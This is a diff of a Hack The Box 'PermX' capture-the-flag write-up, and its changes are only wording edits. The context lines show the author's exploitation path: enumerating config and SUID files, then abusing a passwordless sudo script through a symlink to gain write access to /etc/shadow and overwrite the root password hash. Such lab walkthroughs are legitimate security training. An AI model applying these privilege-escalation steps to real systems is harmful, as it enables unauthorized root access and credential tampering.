@@ -67,7 +67,7 @@ And after running the command against the VHOST we get
 
 **lms.permx.htb**
 
-ITS ALWAYS DNS!!!!!!!
+WHY IS IT ALWAYS DNS!!!!!!!
 
 Lets add this bad boy to our hosts file and lets see what we got… Looks like we have a login page with the administrator mentioned at the bottom.
 
@@ -83,8 +83,7 @@ Downloading this and reviewing the exploit it can either check for the vulnerabi
 
 Looks like we are **www-data** but we can still read the etc/passwd looks to be a single human user of mtz that's where our user flag will be… Lets start enumerating this box and see how we can get it.
 
-In poking around we get this find an interesting file
-
+In poking around we get this find an interesting file...
 ```bash
 └─$ find / -type f -name "*config*" 2>/dev/null 
 ...
@@ -111,8 +110,7 @@ mtz@permx:~$ cat user.txt
 
 I’m in and we got the flag… Now to escalate to root!
 
-Lets start by enumerating what processes can be run as superuser
-
+Lets start by enumerating what processes can be run as superuser.
 ```bash
 mtz@permx:~$ find / -perm -u=s -type f 2>/dev/null
 ...
@@ -135,15 +133,14 @@ User mtz may run the following commands on permx:
     (ALL : ALL) NOPASSWD: /opt/acl.sh
 ```
 
-We can run **[acl.sh](http://acl.sh)** as a sudo user without a password. Looking at the script is assigns permissions to a given target file but does restrict the user to only be able to run it on their home directory. We can’t edit this file but we can abuse the security check by creating a symbolic link to root
-
+We can run **[acl.sh](http://acl.sh)** as a sudo user without a password. Looking at the script is assigns permissions to a given target file but does restrict the user to only be able to run it on their home directory. We can’t edit this file but we can abuse the security check by creating a symbolic link to root.
 ```bash
 mtz@permx:~$ ln -s / root # Create temp symbolic link
 mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow # GIB SHADOW FILE PERMS
 mtz@permx:~$ vim /etc/shadow 
 ```
 
-Here we can pull the hashed root password and crack it… or we can just overwrite it with mtz password then we can `su root` input mtz password and BAM
+Here we can pull the hashed root password and crack it… or we can just overwrite it with mtz password then we can `su root` input mtz password and BAM!!!
 
 ```bash
 mtz@permx:~$ su root
@@ -152,5 +149,5 @@ root@permx:/home/mtz# cat /root/root.txt
 ==============ROOT_FLAG_STRING==============
 ```
 
-We got the root flag baby! And this [rubber stamp of approval](https://www.hackthebox.com/achievement/machine/1695260/613) from hack the box. My smooth brain feels satisfied
+We got the root flag baby! And this [rubber stamp of approval](https://www.hackthebox.com/achievement/machine/1695260/613) from hack the box. My smooth brain feels satisfied. I'm going to go touch some grass now :D
 
